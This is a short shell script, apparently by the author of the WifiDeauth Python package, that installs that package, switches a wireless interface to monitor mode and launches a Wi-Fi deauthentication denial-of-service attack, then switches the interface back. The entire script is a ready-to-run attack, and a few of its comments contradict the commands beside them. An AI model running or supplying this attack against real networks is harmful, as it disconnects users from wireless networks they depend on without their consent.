# This script launch WifiDeauth attack

###########################
# This script use python3 package named WifiDeauth
# get it with this command: "python3 -m pip install WifiDeauth"
# Package URL:        https://pypi.org/project/WifiDeauth/
# Github URL:         https://github.com/mauricelambert/WifiDeauth
# Documentation URL:  https://mauricelambert.github.io/info/python/security/WifiDeauth.html
#
# By Maurice Lambert - 2021
###########################

# Tested with Kali [Based on Debian Testing] (with Full Meta Package)

systemctl list-unit-files | grep enable | grep etwork
systemctl stop networking
systemctl stop NetworkManager                    # Stop network services

ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up                                # Mode monitor on wlan0

systemctl start networking                       # Start networking service

python3 -m WifiDeauth -vvv -i "wlan0"            # Launch deauth DOS attack (press Ctrl+C to stop it)

systemctl start networking                       # Stop networking service

ifconfig wlan0 down
iwconfig wlan0 mode managed
ifconfig wlan0 up                                # Mode monitor on wlan0

systemctl start networking
systemctl start NetworkManager                   # Start network services
